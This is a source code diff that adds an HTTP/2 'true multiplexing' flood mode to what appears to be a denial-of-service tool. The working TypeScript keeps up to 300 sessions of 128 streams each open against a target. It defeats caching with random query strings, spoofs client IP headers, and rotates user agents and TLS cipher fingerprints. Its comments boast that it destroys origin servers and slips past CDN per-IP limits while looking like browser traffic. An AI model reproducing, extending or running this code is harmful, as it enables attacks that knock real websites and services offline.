@@ -7816,6 +7816,185 @@ async function runBypassStorm(
 //  Combined effect: impossible to mitigate without taking the entire service down.
 //  Deploy: 9 × CPU_COUNT workers each running this → 9 × CPU simultaneous pressure.
 // ═══════════════════════════════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════════════════════════════════
+//  HTTP/2 TRUE MULTIPLEXING — Sustained concurrent-stream pool exhaustion
+//
+//  Unlike rapid-reset (fire + RST immediately), this mode keeps N streams
+//  open simultaneously per session. When one stream finishes, a new one
+//  opens instantly — maintaining constant pressure with minimum TCP connections.
+//
+//  Why it destroys origins more efficiently than HTTP/1.1 floods:
+//    • 1 TCP connection x 128 streams  vs  128 TCP connections x 1 stream
+//    • 10x less RAM on our side -> no OOM, run longer, more total pressure
+//    • More CPU on server side — H2 stream scheduling is heavier than HTTP/1.1
+//    • Bypasses per-IP conn limits: CDN limits 100 conns/IP but
+//      10 sessions x 128 streams = 1,280 concurrent requests from 1 IP
+//    • Appears as legitimate browser traffic (browsers also multiplex H2)
+//    • POST requests force body buffer + handler dispatch every stream
+//    • Cache-buster on every stream -> 100% origin cache miss -> origin hammered
+//
+//  Session lifecycle:
+//    connect -> read server SETTINGS(maxConcurrentStreams) -> fillSlots()
+//    fillSlots: keeps exactly maxStreams active simultaneously, zero dead time
+//    When stream closes/errors -> setImmediate(fillSlots) -> instant refill
+//    On session GOAWAY -> reconnect in < 30ms, new session slot opens
+//
+//  Dev:  20 sessions x 32 streams =    640 concurrent requests over  20 TCP conns
+//  Prod: 150 sessions x 128 streams = 19,200 concurrent requests over 150 TCP conns
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runH2Multiplex(
+  resolvedHost: string,
+  hostname:     string,
+  targetPort:   number,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+  proxies:      ProxyConfig[] = [],
+): Promise<void> {
+  const { connect: h2connect } = await import("node:http2");
+
+  // Each session = 1 TLS connection. Keep low in dev to stay under 768MB RAM.
+  const NUM_SESSIONS    = IS_DEPLOYED ? Math.min(threads, 300) : Math.min(threads, 20);
+  // Initial target per session — server may lower via SETTINGS frame
+  const INIT_STREAMS    = IS_DEPLOYED ? 128 : 32;
+  // POST body sizes — vary to force different server handler code paths
+  const POST_BODY_SIZES = [512, 1024, 2048, 4096, 8192];
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  // Session slot — loops forever, reconnects on GOAWAY / error
+  const runSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await new Promise<void>(resolve => {
+        let session: ReturnType<typeof h2connect> | null = null;
+        let maxStreams  = INIT_STREAMS;
+        let activeCount = 0;
+        let settled     = false;
+
+        const finish = () => {
+          if (!settled) {
+            settled = true;
+            try { session?.destroy(); } catch { /**/ }
+            resolve();
+          }
+        };
+
+        try {
+          session = h2connect(`https://${resolvedHost}:${targetPort}`, {
+            rejectUnauthorized: false,
+            ciphers:       randomJA3Ciphers(),
+            ALPNProtocols: ["h2", "http/1.1"],
+            settings: {
+              ...CHROME_H2_SETTINGS,
+              maxConcurrentStreams: INIT_STREAMS,
+              initialWindowSize:   6_291_456,   // 6 MB — prevents flow-control stalls
+            },
+          });
+        } catch { resolve(); return; }
+
+        const sess = session;
+
+        // Adapt to server's maxConcurrentStreams in real time
+        sess.on("remoteSettings", (s: { maxConcurrentStreams?: number }) => {
+          if (typeof s.maxConcurrentStreams === "number" && s.maxConcurrentStreams > 0) {
+            maxStreams = Math.min(s.maxConcurrentStreams, INIT_STREAMS);
+          }
+        });
+
+        // fillSlots: opens new streams until we reach maxStreams
+        const fillSlots = (): void => {
+          if (signal.aborted || sess.destroyed || settled) return;
+          while (activeCount < maxStreams && !signal.aborted && !sess.destroyed && !settled) {
+            openStream();
+          }
+        };
+
+        // openStream: opens 1 stream, drains response, refills slot on close
+        const openStream = (): void => {
+          if (signal.aborted || sess.destroyed || settled) return;
+
+          const usePost  = Math.random() < 0.40;
+          const bodySize = usePost ? POST_BODY_SIZES[randInt(0, POST_BODY_SIZES.length)] : 0;
+          const path     = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9_999_999)}&t=${Date.now().toString(36)}`;
+
+          try {
+            const req = sess.request({
+              ":method":            usePost ? "POST" : (Math.random() < 0.85 ? "GET" : "HEAD"),
+              ":path":              path,
+              ":scheme":            "https",
+              ":authority":         hostname,
+              "user-agent":         randUA(),
+              "accept":             "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,*/*;q=0.8",
+              "accept-encoding":    "gzip, deflate, br, zstd",
+              "accept-language":    "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+              "cache-control":      "no-cache, no-store, must-revalidate",
+              "pragma":             "no-cache",
+              "x-forwarded-for":    `${randIp()}, ${randIp()}`,
+              "x-real-ip":          randIp(),
+              "cf-connecting-ip":   randIp(),
+              "referer":            `https://www.google.com/search?q=${randStr(6)}`,
+              "x-request-id":       `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
+              "cookie":             `session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
+              "sec-ch-ua":          `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="8"`,
+              "sec-ch-ua-mobile":   "?0",
+              "sec-ch-ua-platform": '"Windows"',
+              ...(usePost ? {
+                "content-type":   "application/x-www-form-urlencoded",
+                "content-length": String(bodySize),
+              } : {}),
+            });
+
+            activeCount++;
+            localPkts++;
+            localBytes += 350 + bodySize;
+
+            // POST: send actual body — forces server body buffer + handler dispatch
+            if (usePost && bodySize > 0) {
+              const body = Buffer.allocUnsafe(bodySize);
+              body.write(`data=${randStr(bodySize - 5)}&t=${Date.now()}`, 0, "ascii");
+              req.end(body);
+            } else {
+              req.end();
+            }
+
+            // Drain response fully — server must send complete response (more origin work)
+            req.on("data", (chunk: Buffer) => { localBytes += chunk.length; });
+
+            // On stream end -> immediately refill this slot (zero idle time)
+            const onDone = () => {
+              activeCount = Math.max(0, activeCount - 1);
+              if (!signal.aborted && !sess.destroyed && !settled) setImmediate(fillSlots);
+            };
+            req.on("close", onDone);
+            req.on("error", onDone);
+
+          } catch {
+            // Session saturated or closed mid-open — back off then refill
+            setTimeout(() => { if (!signal.aborted && !settled) fillSlots(); }, 15);
+          }
+        };
+
+        sess.once("connect", () => { fillSlots(); });
+        sess.on("error",  finish);
+        sess.on("close",  finish);
+        sess.on("goaway", finish);
+        signal.addEventListener("abort", finish, { once: true });
+      });
+
+      // Reconnect pause — prevents tight spin on persistent server rejection
+      if (!signal.aborted) {
+        await new Promise(r => setTimeout(r, IS_DEPLOYED ? 5 + randInt(0, 10) : 20 + randInt(0, 20)));
+      }
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSlot()));
+  clearInterval(flushIv);
+  flush();
+}
+
 async function runGeassUltima(
   base:         string,
   resolvedHost: string,
@@ -7905,6 +8084,12 @@ async function runWorker() {
   } else if (cfg.method === "http2-flood") {
     // Native HTTP/2 with multiplexed streams (node:http2)
     await runHTTP2Flood(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "h2-multiplex") {
+    // HTTP/2 true multiplexing — N sessions x maxStreams concurrent open streams
+    // Each session maintains constant pressure: stream closes → new stream opens instantly
+    // 10x fewer TCP connections than HTTP/1.1 for same concurrency, 10x more server CPU
+    await runH2Multiplex(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "cdn-slow-exhaust") {
     // CDN Pool Exhaust: COMPLETE headers forwarded through CDN → origin holds thread
